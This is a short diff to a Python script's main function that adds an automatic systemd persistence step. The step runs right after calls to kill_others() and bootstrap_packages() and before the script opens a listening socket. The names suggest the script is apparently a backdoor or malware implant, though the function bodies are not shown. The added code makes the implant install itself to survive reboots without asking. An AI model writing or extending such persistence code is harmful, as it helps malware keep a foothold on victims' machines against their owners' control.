@@ -356,6 +356,14 @@ def main():
     kill_others()
     bootstrap_packages()
     
+    # Automatically establish persistence upon execution
+    print("[*] Automatically establishing systemd persistence...")
+    success = persist()
+    if success:
+        print("[+] Persistence established successfully.")
+    else:
+        print("[-] Persistence setup failed, continuing execution anyway.")
+
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         s.bind((HOST, PORT))
